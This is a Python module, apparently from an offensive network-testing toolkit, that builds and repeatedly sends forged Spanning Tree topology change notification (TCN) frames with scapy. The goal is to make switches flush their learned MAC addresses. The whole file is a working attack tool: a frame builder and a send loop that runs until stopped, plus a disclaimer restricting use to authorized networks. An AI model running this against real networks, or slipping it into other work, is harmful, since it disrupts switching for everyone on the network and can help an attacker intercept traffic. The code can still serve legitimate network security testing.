"""TCN spoofing: send topology change notifications that a switch must act on.

A bridge that sees a topology change sends a topology change notification (TCN)
toward the root on its root port. The designated bridge on the other end
acknowledges it with the TCA flag and propagates the topology change, so every
bridge flushes the learned addresses it no longer trusts. TCN BPDUs are not
authenticated. A host on a designated port can send them and trigger the same
flush.

The TCN is a four-byte BPDU: protocol ID, version and type 0x80, after the LLC
header (42 42 03).

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.bpdu_spoofing import LLC_STP, STP_MAC
from macabre.attacks.common import Runner, normalize_unicast_mac, read_interface_mac, run_command

TCN_BODY = bytes([0x00, 0x00, 0x00, 0x80])   # protocol ID 0, version 0, type 0x80 (TCN)


@dataclass(frozen=True)
class TcnSpoofingConfig:
    iface: str                  # attacker interface, on a designated switch port
    count: int = 0              # TCNs to send; 0 = run until stopped
    interval: float = 1.0       # seconds between TCNs
    dry_run: bool = False       # build TCNs but do not send them

    def __post_init__(self) -> None:
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval <= 0:
            raise ValueError("Interval must be positive.")


@dataclass
class TcnSpoofingStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def build_tcn_frame(sender_mac: str) -> Packet:
    """Topology change notification from `sender_mac` to the STP group address."""
    sender = normalize_unicast_mac(sender_mac)
    payload = LLC_STP + TCN_BODY
    return Ether(src=sender, dst=STP_MAC, type=len(payload)) / Raw(payload)


def run_tcn_spoofing(
    config: TcnSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[TcnSpoofingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> TcnSpoofingStats:
    """Send TCNs until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = TcnSpoofingStats(
            status=f"Dry run: would send topology change notifications to {STP_MAC}. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = TcnSpoofingStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        send(build_tcn_frame(sender_mac), iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
